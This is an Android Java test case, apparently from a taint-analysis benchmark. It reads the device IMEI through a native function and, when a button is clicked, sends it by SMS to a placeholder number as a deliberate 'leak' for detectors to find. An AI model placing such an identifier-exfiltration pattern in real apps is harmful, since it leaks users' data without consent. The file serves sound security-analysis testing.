package mod.ndk;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

/**
 * @testcase_name SourceInNativeCode
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Obtains the IMEI in native code and leaks it in Java code
 * @dataflow source in native code -> imei -> leak in Java
 * @number_of_leaks 1
 * @challenges the analysis must handle native method invocations
 */
public class ActMain extends Activity {
	static {
		System.loadLibrary("ndkmod");
	}

	// ___________________
	public native String cFuncGetIMEI(Context context); // Source in C code
	// ___________________

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.lay_main);
		Button button = (Button) findViewById(R.id.button1);
		button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View arg0) {
				String strOut = "\n- cFuncGetIMEI(this):["+cFuncGetIMEI(getApplicationContext())+"]";

				Toast.makeText(ActMain.this, strOut, Toast.LENGTH_LONG).show();
				
				SmsManager sms = SmsManager.getDefault();
		        sms.sendTextMessage("+49 1234", null, strOut, null, null);  //sink, leak 
			}
		});
	}
}